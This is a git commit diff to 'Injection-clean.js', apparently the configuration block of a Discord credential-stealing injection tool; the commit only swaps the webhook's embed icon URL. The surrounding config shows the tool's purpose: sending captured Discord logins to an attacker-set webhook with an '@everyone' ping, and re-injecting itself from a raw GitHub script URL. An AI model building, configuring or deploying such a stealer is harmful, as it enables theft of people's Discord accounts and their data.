579ccf3ff7c0d7b9bc2ceae472fd7e52d86409c1
xrevix <85802406+xrevix@users.noreply.github.com>
2022-05-21 17:27:46 +0430

    Update Injection-clean.js

--- Injection-clean.js
+++ Injection-clean.js
@@ -10,7 +10,7 @@ const config = {
   ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
   ping_val: "@everyone", //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
   embed_name: "Discord Injection [Python]", //name of the webhook thats gonna send the info
-  embed_icon:"https://cdn.discordapp.com/attachments/972488565994954782/976000116810973204/app-4.png", //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
+  embed_icon:"https://cdn.discordapp.com/attachments/976016245927313478/977553597803950080/Exo.png?size=4096", //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 5576300, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
   webhook: "%WEBHOOK%", //your discord webhook there obviously
   injection_url: "https://raw.githubusercontent.com/xrevix/injection/main/injection.js", //injection url for when it reinjects
